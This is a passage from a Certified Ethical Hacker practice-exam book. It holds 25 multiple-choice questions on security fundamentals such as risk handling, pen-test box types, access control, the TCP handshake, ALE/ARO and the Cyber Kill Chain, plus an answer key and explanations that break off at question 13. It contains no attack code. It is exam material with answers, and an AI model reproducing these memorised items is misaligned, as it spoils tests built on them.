key study materials for success on the exam—designed supposedly to validate your knowledge
and skills from aforementioned curriculum and training. EC-Council states it this way, however:
“All learning materials related to exams including EC-Council official courseware and trainings
are developed independently of exam content. This is because the exams are created to assess
competence when using the skills and knowledge, not the effectiveness of a specific courseware
or training.”

I include this here not to scare you off or to give you the impression that the courseware,
classrooms, or study guides aren’t valid, but to remind you, as I’ve said seemingly a billion times
now, not to rely on one source for your study. Build a lab. Practice. Get together with like-minded
folks and talk out issues you find in practicing with tools or taking practice exams. Trust me, you’ll
be better off for it.

Best of luck to you, dear reader. I sincerely hope your exam goes well for you and that your
career is filled with great experiences. Be honest, do a good job, and make every day and action
work toward a better world.

In This Book
I’ve organized this book so that each chapter consists of a battery of practice exam questions rep-
resenting part of the knowledge and skills you need to know to pass the Certified Ethical Hacker
exam. This book was designed to mirror the organization of CEH Certified Ethical Hacker All-in-
One Exam Guide, Fifth Edition, and it serves as an excellent companion.

Online Practice Exams

In addition to the practice questions included in this book, 250 practice questions are provided in
an electronic test engine. You can create custom exams by chapter, or you can take multiple timed,
full-length practice exams. For more information, please see the appendix.

Introduction

xvi

00-FM.indd 16 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

Tools, Sites, and References Disclaimer
All URLs listed in this book were current and live at the time of writing. McGraw Hill makes
no warranty as to the availability of these World Wide Web or Internet pages. McGraw Hill
has not reviewed or approved the accuracy of the contents of these pages and specifically
disclaims any warranties of merchantability or fitness for a particular purpose.

Introduction

xvii

00-FM.indd 17 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: xviii

This page intentionally left blank

00-FM.indd 18 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

CHAPTER

Getting Started: 1
Essential Knowledge
This chapter includes questions from the following topics:

• Identify components of TCP/IP computer networking
• Understand basic elements of information security
• Understand incident management steps
• Identify fundamentals of security policies
• Identify essential terminology associated with ethical hacking
• Define ethical hacker and classifications of hackers
• Describe the five stages of ethical hacking
• Define the types of system attacks
• Identify laws, acts, and standards affecting IT security
• Identify Cyber Kill Chain methodology terms

In one of my earliest memories, I’m sitting at the table on Thanksgiving, staring lovingly at a hot
apple pie being sliced into pieces and doled out onto plates. I remember watching an ice cream
bowl chase the pie slices around the table, and each person scooping out delicious vanilla goodness
for the top of their pie. And I remember looking at that flaky crust and the sugary, syrupy insides
and thinking how great it was going to be when I got mine. But then I remember my mom look-
ing right at me and saying, “Looks good, doesn’t it? All you’ve got to do is finish your vegetables
and you can have some.”

I dearly love apple pie à la mode. It’s my favorite dessert on the planet—my ambrosia, if you
will. I love it so much that aggressively displacing toddlers out of my way to get to dessert nirvana
isn’t out of the question (okay, maybe just sternly threatening them, but you get the idea). But I
absolutely despised most of the veggies I was forced to eat as a kid. Greens, peas, carrots, asparagus?
Might as well have been kryptonite for Superman. Mom, why not just ask me to stab my eyes out
with a fork—or, worse yet, ask me to wear Auburn colors?

But when push came to shove, I ate the vegetables. Not because I liked them or because I
wanted to, but because I had to in order to get what I really wanted.

1

01-ch01.indd 1 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

Welcome to your veggie plate, dear reader. No, it’s not the exciting dessert you’re drooling
over—all those delicious hacking questions come later—but this is stuff you just have to get out
of the way first. The good news with this part of your exam is that this is the easy stuff. It’s almost
pure memorization and definitions—with no wacky formulas or script nuances to figure out. And
don’t worry, it’s not nearly as bad as you think it’s going to be. At least I’m not making you put
on blue and orange.

STUDY TIPS When it comes to studying this chapter, where mostly definitions
and rote memorization are all that is required for the exam, repetition is the
key. Tables with words on one side and corresponding definitions on the
other can be pretty effective—and don’t discount old-school flash cards

either. When studying, try to find some key words in each definition you can associate
with the term. That way, when you’re looking at a weird test question on the exam, a key
word will pop out and help provide the answer for you. And for goodness sake, please try
not to confuse the real world with the exam—trust what you get out of this book and your
other study material, and don’t read too much into the questions.

Some of the most confusing questions for you in this section will probably come from
security policies, laws and standards, and security control mechanisms. All these questions
can get really weird, and I’d love to offer help with them, but I can’t—you just have to
memorize the data. Especially when it comes to laws and standards questions, they will
sometimes be maddening. My best advice is to concentrate on key words and remember
that the process of elimination can sometimes be more helpful in narrowing the options
down to the correct answer than trying to memorize everything in the first place.

Also, and at the risk of generating derision from the “Thank you, Captain Obvious”
crowd, here’s another piece of advice I have for you: spend your time on the things you
don’t already know (trust me, I’m on to something here). Many exam prospects and
students spend way too much valuable time repeating portions they already know
instead of concentrating on the things they don’t. If you understand the definitions
regarding white hat and black hat, don’t bother reviewing them. Instead, spend your
time concentrating on areas that aren’t so “common sense” to you.

And, finally, keep in mind that this certification is provided by an international organization.
Therefore, you will sometimes see some fairly atrocious grammar on test questions here
and there, especially in this section of the exam. Don’t worry about it—just keep focused
on the main point of the question and look for your key words.

CEH Certified Ethical Hacker Practice Exams

2

01-ch01.indd 2 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

QUESTIONS

1. A security team is implementing various security controls across the organization. After Q
considering several configurations and applications, a final agreed-on set of security
controls is put into place; however, not all risks are mitigated by the controls. Of the
following, which is the next best step?

A. Continue applying controls until all risk is eliminated.

B. Ignore any remaining risk as “best effort controlled.”

C. Ensure that any remaining risk is residual or low and accept the risk.

D. Remove all controls.

2. A Certified Ethical Hacker (CEH) follows a specific methodology for testing a system.
Which step comes after footprinting in the CEH methodology?

A. Scanning

B. Enumeration

C. Reconnaissance

D. Application attack

3. Your organization is planning for the future and is identifying the systems and processes
critical for their continued operation. Which of the following best describes this effort?

A. BCP

B. BIA

C. DRP

D. ALE

4. Which incident response (IR) phase is responsible for setting rules, identifying the
workforce and roles, and creating backup and test plans for the organization?

A. Preparation

B. Identification

C. Containment

D. Recovery

5. You’ve been hired as part of a pen test team. During the brief, you learn the client wants
the pen test attack to simulate a normal user who finds ways to elevate privileges and
create attacks. Which test type does the client want?

A. White box

B. Gray box

C. Black box

D. Hybrid

Chapter 1: Getting Started: Essential Knowledge

3

01-ch01.indd 3 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

6. Which of the following is defined as ensuring the enforcement of organizational security
policy does not rely on voluntary user compliance by assigning sensitivity labels on
information and comparing this to the level of security a user is operating at?

A. Mandatory access control

B. Authorized access control

C. Role-based access control

D. Discretionary access control

7. Which of the following statements is true regarding the TCP three-way handshake?

A. The recipient sets the initial sequence number in the second step.

B. The sender sets the initial sequence number in the third step.

C. When accepting the communications request, the recipient responds with an
acknowledgement and a randomly generated sequence number in the second step.

D. When accepting the communications request, the recipient responds with an
acknowledgement and a randomly generated sequence number in the third step.

8. Your network contains certain servers that typically fail once every five years. The total cost
of one of these servers is $1000. Server technicians are paid $40 per hour, and a typical
replacement requires two hours. Ten employees, earning an average of $20 per hour, rely
on these servers, and even one of them going down puts the whole group in a wait state
until it’s brought back up. Which of the following represents the ARO for a server?

A. $296

B. $1480

C. $1000

D. 0.20

9. An ethical hacker is given no prior knowledge of the network and has a specific framework
in which to work. The agreement specifies boundaries, nondisclosure agreements, and a
completion date definition. Which of the following statements is true?

A. A white hat is attempting a black-box test.

B. A white hat is attempting a white-box test.

C. A black hat is attempting a black-box test.

D. A black hat is attempting a gray-box test.

10. Which of the following is a detective control?

A. Audit trail

B. CONOPS

C. Procedure

D. Smartcard authentication

E. Process

CEH Certified Ethical Hacker Practice Exams

4

01-ch01.indd 4 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

11. As part of a pen test on a U.S. government system, you discover files containing Social
Security numbers and other sensitive personally identifiable information (PII). You
are asked about controls placed on the dissemination of this information. Which of the
following acts should you check?

A. FISMA

B. Privacy Act

C. PATRIOT Act

D. Freedom of Information Act

12. In which step of the Cyber Kill Chain methodology would an adversary create a deliverable
malicious payload?

A. Command and Control (C2)

B. Weaponization

C. Installation

D. Exploitation

13. An organization’s leadership is concerned about social engineering and hires a company to
provide training for all employees. How is the organization handling the risk associated
with social engineering?

A. They are accepting the risk.

B. They are avoiding the risk.

C. They are mitigating the risk.

D. They are transferring the risk.

14. In which phase of the ethical hacking methodology would a hacker be expected to discover
available targets on a network?

A. Reconnaissance

B. Scanning and enumeration

C. Gaining access

D. Maintaining access

E. Covering tracks

15. Which of the following was created to protect shareholders and the general public from
corporate accounting errors and fraudulent practices as well as to improve the accuracy of
corporate disclosures?

A. GLBA

B. HIPAA

C. SOX

D. FITARA

Chapter 1: Getting Started: Essential Knowledge

5

01-ch01.indd 5 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

16. Which of the following best defines a logical or technical control?

A. Air conditioning

B. Security tokens

C. Fire alarms

D. Security policy

17. Which of the following was created to protect credit card data at rest and in transit in an
effort to reduce fraud?

A. TCSEC

B. Common Criteria

C. ISO 27002

D. PCI DSS

18. As part of the preparation phase for a pen test you are participating in, the client relays
their intent to discover security flaws and possible remediation. They seem particularly
concerned about internal threats from the user base. Which of the following best describes
the test type the client is looking for?

A. Gray box

B. Black box

C. White hat

D. Black hat

19. In which phase of the attack would a hacker set up and configure “zombie” machines?

A. Reconnaissance

B. Covering tracks

C. Gaining access

D. Maintaining access

20. Which of the following should not be included in a security policy?

A. Policy exceptions

B. Details on noncompliance disciplinary actions

C. Technical details and procedures

D. Supporting document references

21. Which of the following is best defined as a set of processes used to identify, analyze,
prioritize, and resolve security incidents?

A. Incident management

B. Vulnerability management

C. Change management

D. Patch management

CEH Certified Ethical Hacker Practice Exams

6

01-ch01.indd 6 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

22. During an assessment, your pen test team discovers child porn on a system. Which of the
following is the appropriate response?

A. Continue testing and report findings at the out-brief.

B. Continue testing but report findings to the business owners.

C. Cease testing immediately and refuse to continue work for the client.

D. Cease testing immediately and contact authorities.

23. Which of the following best describes an intranet zone?

A. A zone with few heavy security restrictions

B. A highly secured zone, usually employing VLANs and encrypted communication
channels

C. A controlled buffer network between public and private networks

D. A very restricted zone with no users

24. A machine in your environment uses an open X-server to allow remote access. The
X-server access control is disabled, allowing connections from almost anywhere and with
little to no authentication measures. Which of the following are true statements regarding
this situation? (Choose all that apply.)

A. An external vulnerability can take advantage of the misconfigured X-server threat.

B. An external threat can take advantage of the misconfigured X-server vulnerability.

C. An internal vulnerability can take advantage of the misconfigured X-server threat.

D. An internal threat can take advantage of the misconfigured X-server vulnerability.

25. Which of the following best describes forensic evidence indicating a potential intrusion
or malicious activity?

A. TTP

B. IOC

C. APT

D. ABI

Chapter 1: Getting Started: Essential Knowledge

7

01-ch01.indd 7 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

QUICK ANSWER KEY

1. C 10. A 19. D

2. A 11. B 20. C

3. B 12. B 21. A

4. A 13. C 22. D

5. B 14. B 23. A

6. A 15. C 24. B, D

7. C 16. B 25. B

8. D 17. D

9. A 18. A

CEH Certified Ethical Hacker Practice Exams

8

01-ch01.indd 8 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

ANSWERS

1. A security team is implementing various security controls across the organization. After A
considering several configurations and applications, a final agreed-on set of security
controls is put into place; however, not all risks are mitigated by the controls. Of the
following, which is the next best step?

A. Continue applying controls until all risk is eliminated.

B. Ignore any remaining risk as “best effort controlled.”

C. Ensure that any remaining risk is residual or low and accept the risk.

D. Remove all controls.

☑ C. Remember at the beginning of this chapter when I said the process of elimination
may be your best bet in some cases? Well, even if you aren’t well-versed in risk
management and security control efforts, you could narrow this down to the correct
answer. It is impossible to remove all risk from any system and still have it usable. I’m
certain there are exceptions to this rule (maybe super-secret machines in underground
vaults buried deep within the earth, running on geothermal-powered batteries,
without any network access at all and controlled by a single operator who hasn’t seen
daylight in many years), but in general the goal of security teams has always been to
reduce risk to an acceptable level.

☐✗ A is incorrect because, as I just mentioned, it’s impossible to reduce risk to absolute
zero and still have a functional system. CEH Certified Ethical Hacker All-in-One Exam
Guide, Fifth Edition, discusses the Security, Functionality, and Usability triangle,
where as you move toward more security, you move further away from functionality
and usability.

☐✗ B is incorrect because it’s just silly. If you’re a security professional and your
response to a risk—any risk—is to ignore it, I can promise you won’t be employed
for long. Sure, you can point out that it’s low or residual and that the chance for
actual exploitation is next to nonexistent, but you can’t ignore it. Best effort is for
kindergarten trophies and IP packet delivery.

☐✗ D is incorrect because removing all controls is worse than ignoring the risk. If you
remove everything, then all risks remain. Remember, the objective is to balance your
security controls to cover as much risk as possible while leaving the system as usable
and functional as possible.

2. A Certified Ethical Hacker (CEH) follows a specific methodology for testing a system.
Which step comes after footprinting in the CEH methodology?

A. Scanning

B. Enumeration

C. Reconnaissance

D. Application attack

Chapter 1: Getting Started: Essential Knowledge

9

01-ch01.indd 9 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ A. CEH methodology is laid out this way: reconnaissance (footprinting), scanning
and enumeration, gaining access, escalating privileges, maintaining access, and
covering tracks. While you may be groaning about scanning and enumeration
both appearing as answers, they’re placed here in this way on purpose. This exam
is not only testing your rote memorization of the methodology but also how the
methodology actually works. Remember, after scoping out the recon on your target,
your next step is to scan it. After all, you have to know what targets are there first
before enumerating information about them.

☐✗ B is incorrect because, although it is mentioned as part of step 2, it’s actually
secondary to scanning. Enumerating is used to gather more in-depth information
about a target you already discovered by scanning. Things you might discover in
scanning are IPs that respond to a ping. In enumerating each “live” IP, you might
find open shares, user account information, and other goodies.

☐✗ C is incorrect because reconnaissance and footprinting are interchangeable in CEH
parlance. An argument can be made that footprinting is a specific portion of an
overall recon effort; however, in all CEH documentation, these terms are used
interchangeably.

☐✗ D is incorrect because it references an attack. As usual, there’s almost always one
answer you can throw out right away, and this is a prime example. We’re talking
about step 2 in the methodology, where we’re still figuring out what targets are there
and what vulnerabilities they may have. Attacking, at this point, is folly.

3. Your organization is planning for the future and is identifying the systems and processes
critical for their continued operation. Which of the following best describes this effort?

A. BCP

B. BIA

C. DRP

D. ALE

☑ B. A business impact analysis (BIA) best matches this description. In a BIA, the
organization looks at all the systems and processes in use and determines which ones
are absolutely critical to continued operation. Additionally, the assessor (the person or
company conducting the analysis) will look at all the existing security architecture and
make an evaluation on the likelihood of any system or resource being compromised.
Part of this is assigning values to systems and services, determining the maximum
tolerable downtime (MTD) for any, and identifying any overlooked vulnerabilities.

☐✗ A is incorrect because a business continuity plan (BCP) contains all the procedures
that should be followed in the event of an organizational outage—such as a natural
disaster or a cyberattack. BCPs include the order in which steps should be taken
and which system should be returned to service first. BCPs include DRPs (disaster
recovery plans).

CEH Certified Ethical Hacker Practice Exams

10

01-ch01.indd 10 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☐✗ C is incorrect because a disaster recovery plan (DRP) contains steps and procedures
for restoring a specific resource (service, system, and so on) after an outage. Usually
DRPs are part of a larger BCP.

☐✗ D is incorrect because the annualized loss expectancy (ALE) is a mathematical
measurement of the cost of replacing or repairing a specific resource. ALE is calculated
by multiplying the single loss expectancy (SLE) by the annualized rate of occurrence
(ARO). For example, if the total cost of a single loss of a resource is calculated at
$1000 and you calculate there is a 10 percent chance it will fail in any given year,
your ALE would be $100.

4. Which incident response (IR) phase is responsible for setting rules, identifying the workforce
and roles, and creating backup and test plans for the organization?

A. Preparation

B. Identification

C. Containment

D. Recovery

☑ A. So even if you weren’t aware of incident response phases, this one should’ve been
a rather easy guess. In the preparation phase, your IR (incident response) team should
be preparing for an incident. Preparation includes lots of things—some of which are
mentioned here. But virtually anything you can think of that does not involve actions
taken during the incident belongs here. Training, exercises, and policies are all examples.

As an aside, IR phases can be different depending on whom you ask and what
the moon phase is, but generally IR is broken down into six phases: preparation,
identification, containment, eradication, recovery, and lessons learned. Preparation
we already covered. Identification refers to the steps taken to verify it’s actually an
incident, and all the information surrounding that—source, destination(s), exploit
used, malware used, and so on. Containment is the step used to cordon off the
infected system(s) and prevent any further spread of infection or attack. Eradication
refers to steps taken to remove the malware (or other attack-related residuals, such
as backdoors). Recovery involves the steps taken to rebuild and restore the system(s)
and network to pre-attack status (with better security, I might add). Finally, lessons
learned is exactly what it sounds like, and it should feed right back into your
organization’s preparation phase.

☐✗ B is incorrect because the identification phase refers to the steps taken to verify the
legitimacy of an active incident and gather information on the details of the attack.

☐✗ C is incorrect because the containment phase deals with the steps taken to reduce or
prevent the spread of the infection or attack inside the network.

☐✗ D is incorrect because the recovery phase deals with the steps taken to restore and
replace any resources damaged or affected by the attack footprint.

Chapter 1: Getting Started: Essential Knowledge

11

01-ch01.indd 11 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

5. You’ve been hired as part of a pen test team. During the brief, you learn the client wants
the pen test attack to simulate a normal user who finds ways to elevate privileges and
create attacks. Which test type does the client want?

A. White box

B. Gray box

C. Black box

D. Hybrid

☑ B. A gray-box test is designed to replicate an inside attacker. Otherwise known as
the partial knowledge attack (don’t forget this term), the idea is to simulate a user on
the inside who might know a little about the network, directory structure, and other
resources in your enterprise. You’ll probably find this one to be the most enlightening
attack in out-briefing your clients in the real world—it’s amazing what you can get
to when you’re a trusted, inside user. As an aside, you’ll often find in the real world
that gray-box testing can also refer to a test where any inside information is given to
a pen tester—you don’t necessarily need to be a fully knowledgeable inside user. In
other words, if you have usable information handed to you about your client, you’re
performing gray-box testing.

☐✗ A is incorrect because the textbook definition of a white-box test is one where all
knowledge is provided to the pen tester up front—the test is designed to simulate
an admin on your network who, for whatever reason, decides to go on the attack.
For most pen testers, this test is really just unfair. It’s tantamount to sending them
into the Roman Colosseum armed with a .50-caliber automatic weapon to battle a
gladiator who is holding a knife.

☐✗ C is incorrect because black-box testing indicates no knowledge at all. And if
you think about it, the name is easy to correlate and remember: black = no light.
Therefore, you can’t “see” anything. This is the test most people think about when it
comes to hacking. You know nothing and are (usually) attacking from the outside.

☐✗ D is incorrect because, as far as I can tell from the EC-Council’s documentation,
there is no terminology for a “hybrid-box” test. This is a little tricky because the term
hybrid is used elsewhere—for attacks and other things. If you apply a little common
sense here, this answer is easy to throw out. If you know everything about the target,
it’s white. If you know nothing, it’s black. If you’re in the middle, it’s gray. See?

6. Which of the following is defined as ensuring the enforcement of organizational security
policy does not rely on voluntary user compliance by assigning sensitivity labels on
information and comparing this to the level of security a user is operating at?

A. Mandatory access control

B. Authorized access control

C. Role-based access control

D. Discretionary access control

CEH Certified Ethical Hacker Practice Exams

12

01-ch01.indd 12 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ A. Access control is defined as the selective restraint of access to a resource, and there
are several overall mechanisms to accomplish this goal. Mandatory access control
(MAC) is one type that constrains the ability of a subject to access or perform an
operation on an object by assigning and comparing “sensitivity labels.” Suppose a
person (or a process) attempts to access or edit a file. With MAC, a label is placed on
the file indicating its security level. If the entity attempting to access it does not have
that level, or higher, then access is denied. With mandatory access control, security
is centrally controlled by a security policy administrator, and users do not have the
ability to override security settings.

This should not be confused with role-based access control (RBAC) systems,
which may actually use MAC to get the job done. The difference is in whether the
information itself has a labeled description or whether the person accessing it has
their own label. For example, in a classified area, the information classified as Top
Secret will have a label on it identifying it as such, while you, as an auditor, will
have your own clearance and need-to-know label allowing you to access certain
information. MAC is a property of an object; RBAC is a property of someone
accessing an object.

☐✗ B is incorrect because while authorized access control may sound great, it’s not a
valid term.

☐✗ C is incorrect because role-based access control can use MAC or discretionary access
control to get the job done. With RBAC, the goal is to assign a role, and any entity
holding that role can perform the duties associated with it. Users are not assigned
permissions directly; they acquire them through their role (or roles). The roles are
assigned to the user’s account, and each additional role provides its own unique set of
permissions and rights.

☐✗ D is incorrect because discretionary access control (DAC) allows the data owner, the
user, to set security permissions for the object. If you’re on a Windows machine right
now, you can create files and folders and then set sharing and permissions on them as
you see fit. MAC administrators in the Department of Defense are shuddering at that
thought right now.

7. Which of the following statements is true regarding the TCP three-way handshake?

A. The recipient sets the initial sequence number in the second step.

B. The sender sets the initial sequence number in the third step.

C. When accepting the communications request, the recipient responds with an
acknowledgement and a randomly generated sequence number in the second step.

D. When accepting the communications request, the recipient responds with an
acknowledgement and a randomly generated sequence number in the third step.

☑ C. The three-way handshake will definitely show up on your exam, and in much
trickier wording than this. It’s easy enough to memorize “SYN, SYN/ACK, ACK,”
but you’ll need more than that for the exam.

Chapter 1: Getting Started: Essential Knowledge

13

01-ch01.indd 13 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

In step 1, the host sends a segment to the server, indicating it wants to open a
communications session. Inside this segment, the host turns on the SYN flag and sets
an initial sequence number (any random 32-bit number). When the recipient gets
the segment, it crafts a segment in response to let the host know it’s open and ready
for the communications session. It does this by turning on the SYN and ACK flags,
acknowledging the initial sequence number by incrementing it, and adding its own
unique sequence number. Then, when the host gets this response back, it sends one
more segment before the comm channel opens. In this segment, it sets the ACK flag
and acknowledges the other’s sequence number by incrementing it.

For example, suppose Host A is trying to open a channel with Server B. In this
example, Host A likes the sequence number 2000, while Server B likes 5000. The
first segment would look like this: SYN=1, ACK=0, ISN=2000. The response
segment would look like this: SYN=1, ACK=1, ISN=5000, ACK NO=2001. The
third and final segment would appear this way: SYN=0, ACK=1, SEQ NO=2001,
ACK NO=5001.

☐✗ A is incorrect because the initial sequence number is set in the first step.

☐✗ B is incorrect for the same reason—the ISN is set in the first step.

☐✗ D is incorrect because this activity occurs in the second step.

8. Your network contains certain servers that typically fail once every five years. The total cost
of one of these servers is $1000. Server technicians are paid $40 per hour, and a typical
replacement requires two hours. Ten employees, earning an average of $20 per hour, rely
on these servers, and even one of them going down puts the whole group in a wait state
until it’s brought back up. Which of the following represents the ARO for a server?

A. $296

B. $1480

C. $1000

D. 0.20

☑ D. When performing business impact analysis (or any other value analysis for that
matter), the annualized loss expectancy (ALE) is an important measurement for every
asset. To compute the ALE, multiply the annualized rate of occurrence (ARO) by the
single loss expectancy (SLE). The ARO is the frequency at which a failure occurs on
an annual basis. In this example, servers fail once every five years, so the ARO would
be 1 failure / 5 years = 20 percent.

☐✗ A is incorrect because this value equates to the ALE for the example. ALE = ARO ×
SLE. In this example, the ARO is 20 percent and the SLE is $1480: cost of a server
($1000) plus the cost of technician work to replace it ($80) plus lost time for workers
(10 employees × 2 hours × $20 an hour, which works out to $400). Therefore,
ALE = 20 percent × $1480, or $296.

CEH Certified Ethical Hacker Practice Exams

14

01-ch01.indd 14 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☐✗ B is incorrect because this value corresponds to the SLE for this scenario. The SLE is
the total cost for a single loss, so we need to count the cost of the server, plus the cost
of the technician’s hours, plus any downtime measurements for other workers. In this
case, SLE = $1000 (cost of server) + $80 (server tech hours) + $400 (10 employees ×
2 hours × $20 an hour), or $1480.

☐✗ C is incorrect because this number doesn’t match the ARO for the example.

9. An ethical hacker is given no prior knowledge of the network and has a specific framework
in which to work. The agreement specifies boundaries, nondisclosure agreements, and a
completion date definition. Which of the following statements is true?

A. A white hat is attempting a black-box test.

B. A white hat is attempting a white-box test.

C. A black hat is attempting a black-box test.

D. A black hat is attempting a gray-box test.

☑ A. I love these types of questions. Not only is this a two-for-one question, but it
involves identical but confusing descriptors, causing all sorts of havoc. The answer
to attacking such questions—and you will see them, by the way—is to take each
section one at a time. Start with what kind of hacker he is. He’s hired under a
specific agreement, with full knowledge and consent of the target, thus making him
a white hat. That eliminates C and D right off the bat. Second, to address what
kind of test he’s performing, simply look at what he knows about the system. In this
instance, he has no prior knowledge at all (apart from the agreement), thus making
it a black-box test.

☐✗ B is incorrect because although the attacker is one of the good guys (a white hat,
proceeding with permission and an agreement in place), he is not provided with full
knowledge of the system. In fact, it’s quite the opposite—according to the question
he knows absolutely nothing about the system, making this particular “box” as
black as it can be. A white-box target indicates one that the attacker already knows
everything about. It’s lit up and wide open.

☐✗ C is incorrect right off the bat because it references a black hat. Black-hat attackers
are the bad guys—the ones proceeding without the target’s knowledge or permission.
They usually don’t have inside knowledge of their target, so their attacks often start
“black box.”

☐✗ D is incorrect for the same reason just listed: because this attacker has permission
to proceed and is operating under an agreement, he can’t be a black-box attacker.
Additionally, this answer went the extra mile to convince you it was wrong—and
missed on both swings. Not only is this a white-hat attacker, but the attack itself is
black box. A gray-box attack indicates at least some inside knowledge of the target.

Chapter 1: Getting Started: Essential Knowledge

15

01-ch01.indd 15 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

10. Which of the following is a detective control?

A. Audit trail

B. CONOPS

C. Procedure

D. Smartcard authentication

E. Process

☑ A. A detective control is an effort used to identify problems, errors, or (in the case of
post-attack discovery) cause or evidence of an exploited vulnerability—and an audit
log or trail is a perfect example. Ideally, detective controls should be in place and
working such that errors can be corrected as quickly as possible. Many compliance
laws and standards (the Sarbanes-Oxley Act of 2002 is one example) mandate the use
of detective controls.

☐✗ B is incorrect because a concept of operations (CONOPS) isn’t detective in nature.
A CONOPS defines what a system is and how it is supposed to be used.

☐✗ C is incorrect because a procedure is a document the spells out specific step-by-step
instructions for a given situation or process.

☐✗ D is incorrect because smartcard authentication is a preventive control, not a detective
one. It’s designed to provide strong authentication, ideally preventing a problem in the
first place.

☐✗ E is incorrect because a process can refer to a lot of different things, depending on your
definition and viewpoint, but is not detective in nature as a control. A process, in general,
refers to a set of steps or actions directed at accomplishing a goal.

11. As part of a pen test on a U.S. government system, you discover files containing Social
Security numbers and other sensitive personally identifiable information (PII). You are
asked about controls placed on the dissemination of this information. Which of the following
acts should you check?

A. FISMA

B. Privacy Act

C. PATRIOT Act

D. Freedom of Information Act

☑ B. The Privacy Act of 1974 protects information of a personal nature, including
Social Security numbers. The Privacy Act defines exactly what “personal information”
is, and it states that government agencies cannot disclose any personal information
about an individual without that person’s consent. It also lists 12 exemptions for the
release of this information (for example, information that is part of a law enforcement
issue may be released). In other questions you see, keep in mind that the Privacy Act
generally will define the information that is not available to you during and after a test.
Dissemination and storage of private information needs to be closely controlled to

CEH Certified Ethical Hacker Practice Exams

16

01-ch01.indd 16 30/03/22 2:40 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

keep you out of hot water. As a side note, how you obtain PII is oftentimes just as
important as how you protect it once discovered. In your real-world adventures, keep
the Wiretap Act (18 U.S. Code Chapter 119—Wire and Electronic Communications
Interception and Interception of Oral Communications) and others like it in mind.

☐✗ A is incorrect because the Federal Information Security Management Act (FISMA)
isn’t designed to control the dissemination of PII or sensitive data. Its primary goal is
to ensure the security of government systems by promoting a standardized approach
to security controls, implementation, and testing. The act requires government
agencies to create a security plan for their systems and to have it “accredited” at least
once every three years.

☐✗ C is incorrect because the PATRIOT Act is not an effort to control personal
information. Its purpose is to aid the U.S. government in preventing terrorism by
increasing the government’s ability to monitor, intercept, and maintain records on
almost every imaginable form of communication. As a side effect, it has also served
to increase observation and prevention of hacking attempts on many systems.

☐✗ D is incorrect because the Freedom of Information Act wasn’t designed to tell you
what to do with information. Its goal is to define how you can get information—
specifically information regarding how your governments work. It doesn’t necessarily
help you in hacking, but it does provide a cover for a lot of information. Anything
you uncover that could have been gathered through the Freedom of Information Act
is considered legal and should be part of your overall test.

12. In which step of the Cyber Kill Chain methodology would an adversary create a deliverable
malicious payload?

A. Command and Control (C2)

B. Weaponization

C. Installation

D. Exploitation

☑ B. Originally developed from a military model by Lockheed Martin (https://
lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) seeking to
quantify how to identify, prepare to attack, engage, and destroy the cyber enemy
target, the Cyber Kill Chain is a methodology for tracing the stages of a cyberattack.
Covering everything from early reconnaissance to data exfiltration (or worse), it
has evolved to help security professionals better understand and combat adversarial
efforts. The methodology includes seven steps—Reconnaissance, Weaponization,
Delivery, Exploitation, Installation, Command and Control (C2), and Actions on
Objectives—detailing an attack from inception to closure. In the Weaponization
stage, adversaries create the deliverable malicious payload using an exploit, and in the
next stage, Delivery, they send it merrily along the way.

☐✗ A is incorrect because in the Command and Control (C2) stage, a C2 channel is created
to pass data and control information back and forth.

Chapter 1: Getting Started: Essential Knowledge

17

01-ch01.indd 17 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☐✗ C is incorrect because in the Installation stage, the malware is actually installed on
the target.

☐✗ D is incorrect because in the Exploitation stage, a vulnerability is exploited via executing
code on the target system.

13. An organization’s leadership is concerned about social engineering and hires a company to
provide training for all employees. How is the organization handling the risk associated
with social engineering?

A. They are accepting the risk.

B. They are avoiding the risk.

C. They are mitigating the risk.

D. They are transferring the risk.

☑ C. When it comes to risks, there are four different methods of attempting to deal
with them. In risk mitigation, steps are taken to reduce the chance that the risk even
will occur, and in this example that’s exactly what’s happening. Training on social
